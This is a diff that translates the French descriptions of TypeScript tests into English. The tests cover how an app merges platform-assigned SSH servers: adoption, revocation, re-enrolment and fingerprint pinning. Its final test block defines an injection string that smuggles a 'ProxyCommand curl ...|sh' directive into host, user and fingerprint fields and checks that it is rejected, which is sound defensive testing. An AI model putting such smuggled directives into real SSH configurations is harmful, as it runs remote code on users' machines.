@@ -55,8 +55,8 @@ function grantOf(servers: readonly Server[]): ServerGrant {
   return found;
 }
 
-describe("un serveur attribué", () => {
-  it("entre dans la liste avec l'adresse et la clé que personne n'a saisies", () => {
+describe("an assigned server", () => {
+  it("enters the list with the address and key nobody typed", () => {
     const merged = merge([], [GRANTED]);
 
     expect(merged.adopted).toEqual(["srv-platform-1"]);
@@ -83,7 +83,7 @@ describe("un serveur attribué", () => {
     ]);
   });
 
-  it("laisse son nom SSH à un serveur d'ici qui le porte déjà", () => {
+  it("leaves its SSH name to a local server that already carries it", () => {
     const merged = merge(
       [{ ...TYPED, host: "198.51.100.7", slug: "vps-atelier" }],
       [GRANTED]
@@ -95,17 +95,17 @@ describe("un serveur attribué", () => {
     ]);
   });
 
-  it("devient le serveur piloté quand l'app n'en avait aucun", () => {
+  it("becomes the driven server when the app had none", () => {
     expect(merge([], [GRANTED]).config.active).toBe("srv-platform-1");
   });
 
-  it("laisse le serveur piloté en place quand il y en avait déjà un", () => {
+  it("leaves the driven server in place when there already was one", () => {
     expect(merge([TYPED], [GRANTED], "srv-local-1").config.active).toBe(
       "srv-local-1"
     );
   });
 
-  it("s'ouvre par la configuration SSH de l'app, sur la clé de l'appareil", () => {
+  it("opens through the app's SSH configuration, on the device's key", () => {
     const [server] = merge([], [GRANTED]).config.servers;
 
     expect(sshArgs(server, PATHS)).toEqual([
@@ -123,7 +123,7 @@ describe("un serveur attribué", () => {
     expect(written).toContain("StrictHostKeyChecking yes");
   });
 
-  it("suit l'adresse et le compte que la plateforme publie ensuite", () => {
+  it("follows the address and account the platform publishes afterwards", () => {
     const [adopted] = merge([], [GRANTED]).config.servers;
     const moved = merge(
       [adopted],
@@ -139,14 +139,14 @@ describe("un serveur attribué", () => {
     });
   });
 
-  it("garde le nom que la personne lui a donné ici", () => {
+  it("keeps the name the person gave it here", () => {
     const [adopted] = merge([], [GRANTED]).config.servers;
     const renamed = { ...adopted, name: "Atelier" };
 
     expect(merge([renamed], [GRANTED]).config.servers[0].name).toBe("Atelier");
   });
 
-  it("n'entre pas dans la liste tant que la plateforme n'a pas son adresse", () => {
+  it("does not enter the list until the platform has its address", () => {
     const merged = merge([], [{ ...GRANTED, host: null }]);
 
     expect(merged.config.servers).toEqual([]);
@@ -154,8 +154,8 @@ describe("un serveur attribué", () => {
   });
 });
 
-describe("un serveur déjà connu de l'app", () => {
-  it("reçoit son attribution sans être ajouté une seconde fois", () => {
+describe("a server the app already knows", () => {
+  it("receives its assignment without being added a second time", () => {
     const merged = merge([TYPED], [GRANTED], "srv-local-1");
 
     expect(merged.config.servers).toHaveLength(1);
@@ -166,33 +166,33 @@ describe("un serveur déjà connu de l'app", () => {
     });
   });
 
-  it("garde le compte que le durcissement a ouvert ici", () => {
+  it("keeps the account hardening opened here", () => {
     const hardened = { ...TYPED, user: "dev" };
     const merged = merge([hardened], [{ ...GRANTED, user: "root" }]);
 
     expect(merged.config.servers[0].user).toBe("dev");
   });
 
-  it("garde sa propre clé plutôt que celle de l'appareil", () => {
+  it("keeps its own key rather than the device's", () => {
     expect(merge([TYPED], [GRANTED]).config.servers[0].keyPath).toBe(
       "/data/keys/srv-local-1"
     );
   });
 
-  it("épingle l'empreinte que la plateforme publie s'il n'en avait aucune", () => {
+  it("pins the fingerprint the platform publishes if it had none", () => {
     expect(merge([TYPED], [GRANTED]).config.servers[0].hostFingerprint).toBe(
       "SHA256:atelier"
     );
   });
 
-  it("ne suit pas une adresse de la plateforme une fois lié", () => {
+  it("does not follow an address from the platform once linked", () => {
     const linked = merge([TYPED], [GRANTED]).config.servers;
     const moved = merge(linked, [{ ...GRANTED, host: "203.0.113.99" }]);
 
     expect(moved.config.servers[0].host).toBe("203.0.113.10");
   });
 
-  it("reste intact quand la plateforme ne le connaît pas", () => {
+  it("stays intact when the platform does not know it", () => {
     const merged = merge([TYPED], []);
 
     expect(merged.config.servers).toEqual([TYPED]);
@@ -200,8 +200,8 @@ describe("un serveur déjà connu de l'app", () => {
   });
 });
 
-describe("la révocation", () => {
-  it("efface le serveur que la plateforme ne liste plus, puisqu'elle l'avait posé", () => {
+describe("revocation", () => {
+  it("erases the server the platform no longer lists, since it had placed it", () => {
     const [adopted] = merge([], [GRANTED]).config.servers;
     const merged = merge([adopted], []);
 
@@ -210,7 +210,7 @@ describe("la révocation", () => {
     expect(merged.changed).toBe(true);
   });
 
-  it("efface le serveur que la plateforme rend révoqué", () => {
+  it("erases the server the platform returns as revoked", () => {
     const [adopted] = merge([], [GRANTED]).config.servers;
     const merged = merge([adopted], [{ ...GRANTED, status: "revoked" }]);
 
@@ -218,7 +218,7 @@ describe("la révocation", () => {
     expect(merged.released).toEqual(["srv-platform-1"]);
   });
 
-  it("garde le serveur qu'on avait saisi ici, attribution tombée ou non", () => {
+  it("keeps the server that was typed here, whether or not the assignment lapsed", () => {
     const bound = merge([TYPED], [GRANTED]).config.servers;
     const merged = merge(bound, []);
 
@@ -226,7 +226,7 @@ describe("la révocation", () => {
     expect(merged.config.servers[0].grant).toMatchObject({ listed: false });
   });
 
-  it("rend un serveur suspendu au premier signe de retour", () => {
+  it("restores a suspended server at the first sign of return", () => {
     const [adopted] = merge([], [GRANTED]).config.servers;
     const suspended = merge([adopted], [{ ...GRANTED, status: "suspended" }]);
     const back = merge(suspended.config.servers, [GRANTED]);
@@ -237,36 +237,36 @@ describe("la révocation", () => {
   });
 });
 
-describe("le retrait sur cet ordinateur", () => {
-  it("ne réadopte pas un serveur attribué qu'on avait retiré", () => {
+describe("removal on this computer", () => {
+  it("does not readopt an assigned server that was removed", () => {
     const merged = merge([], [GRANTED], null, ["srv-platform-1"]);
 
     expect(merged.config.servers).toEqual([]);
     expect(merged.adopted).toEqual([]);
   });
 
-  it("garde la mémoire du retrait tant que la plateforme l'attribue", () => {
+  it("keeps the memory of the removal while the platform assigns it", () => {
     expect(
       merge([], [GRANTED], null, ["srv-platform-1"]).config.dismissed
     ).toEqual(["srv-platform-1"]);
   });
 
-  it("oublie le retrait dès que la plateforme cesse de l'attribuer", () => {
+  it("forgets the removal as soon as the platform stops assigning it", () => {
     const merged = merge([], [], null, ["srv-platform-1"]);
 
     expect(merged.config.dismissed).toEqual([]);
     expect(merged.changed).toBe(true);
   });
 
-  it("rend le serveur dès que la mémoire du retrait est effacée", () => {
+  it("returns the server as soon as the memory of the removal is erased", () => {
     expect(merge([], [GRANTED], null, []).config.servers).toHaveLength(1);
   });
 });
 
-describe("le réenrôlement", () => {
+describe("re-enrolment", () => {
   const REENROLLED: FleetServer = { ...GRANTED, id: "srv-platform-2" };
 
-  it("suit la même machine sous son nouvel identifiant, sans la dédoubler", () => {
+  it("follows the same machine under its new identifier, without duplicating it", () => {
     const [adopted] = merge([], [GRANTED]).config.servers;
     const merged = merge([adopted], [REENROLLED]);
 
@@ -277,7 +277,7 @@ describe("le réenrôlement", () => {
     });
   });
 
-  it("suit aussi un serveur qu'on avait saisi ici", () => {
+  it("also follows a server that was typed here", () => {
     const bound = merge([TYPED], [GRANTED]).config.servers;
     const merged = merge(bound, [REENROLLED]);
 
@@ -289,7 +289,7 @@ describe("le réenrôlement", () => {
     });
   });
 
-  it("ne confond pas deux serveurs que la plateforme liste toujours tous les deux", () => {
+  it("does not confuse two servers the platform still lists, both of them", () => {
     const [adopted] = merge([], [GRANTED]).config.servers;
     const merged = merge([adopted], [GRANTED, REENROLLED]);
 
@@ -300,12 +300,12 @@ describe("le réenrôlement", () => {
   });
 });
 
-describe("l'état d'une attribution", () => {
-  it("s'ouvre quand la plateforme la liste, active, la clé prête", () => {
+describe("the state of an assignment", () => {
+  it("opens when the platform lists it, active, with the key ready", () => {
     expect(grantOpens(grantOf(merge([], [GRANTED]).config.servers))).toBe(true);
   });
 
-  it("attend tant que la plateforme n'a aucune clé de ce compte", () => {
+  it("waits while the platform has no key for this account", () => {
     const waiting = grantOf(
       merge([], [{ ...GRANTED, keyReady: false }]).config.servers
     );
@@ -314,7 +314,7 @@ describe("l'état d'une attribution", () => {
     expect(grantOpens(waiting)).toBe(false);
   });
 
-  it("attend tant que le serveur s'enrôle", () => {
+  it("waits while the server enrols", () => {
     const enrolling = grantOf(
       merge([], [{ ...GRANTED, status: "enrolling" }]).config.servers
     );
@@ -322,7 +322,7 @@ describe("l'état d'une attribution", () => {
     expect(grantPending(enrolling)).toBe(true);
   });
 
-  it("est retirée dès que la plateforme cesse de la lister", () => {
+  it("is removed as soon as the platform stops listing it", () => {
     const bound = merge([TYPED], [GRANTED]).config.servers;
     const gone = grantOf(merge(bound, []).config.servers);
 
@@ -331,8 +331,8 @@ describe("l'état d'une attribution", () => {
   });
 });
 
-describe("la fusion", () => {
-  it("dit que rien n'a changé quand rien n'a changé", () => {
+describe("the merge", () => {
+  it("reports no change when nothing changed", () => {
     const first = merge([], [GRANTED]);
     const again = merge(first.config.servers, [GRANTED], first.config.active);
 
@@ -340,7 +340,7 @@ describe("la fusion", () => {
     expect(again.changed).toBe(false);
   });
 
-  it("ne touche pas à un hôte du système", () => {
+  it("does not touch a system host", () => {
     const system: Server = {
       host: "atelier",
       id: "srv-system",
@@ -354,7 +354,7 @@ describe("la fusion", () => {
   });
 });
 
-describe("une attribution qui porterait une directive SSH", () => {
+describe("an assignment that would carry an SSH directive", () => {
   const INJECTION = "x\nProxyCommand curl a.bc|sh";
 
   const UNFIT: FleetServer[] = [
@@ -368,7 +368,7 @@ describe("une attribution qui porterait une directive SSH", () => {
     { ...GRANTED, hostFingerprint: `SHA256:abc${INJECTION}` },
   ];
 
-  it("n'entre jamais dans la liste", () => {
+  it("never enters the list", () => {
     for (const granted of UNFIT) {
       const merged = merge([], [granted]);
 
@@ -377,7 +377,7 @@ describe("une attribution qui porterait une directive SSH", () => {
     }
   });
 
-  it("laisse à un serveur déjà adopté l'adresse et le compte qu'il avait", () => {
+  it("leaves an already adopted server the address and account it had", () => {
     const [adopted] = merge([], [GRANTED]).config.servers;
 
     for (const granted of UNFIT.filter((unfit) => unfit.id === GRANTED.id)) {
@@ -393,7 +393,7 @@ describe("une attribution qui porterait une directive SSH", () => {
     }
   });
 
-  it("ne prête pas son empreinte à un serveur tapé ici", () => {
+  it("does not lend its fingerprint to a server typed here", () => {
     const [kept] = merge(
       [TYPED],
       [{ ...GRANTED, hostFingerprint: `SHA256:abc${INJECTION}` }]
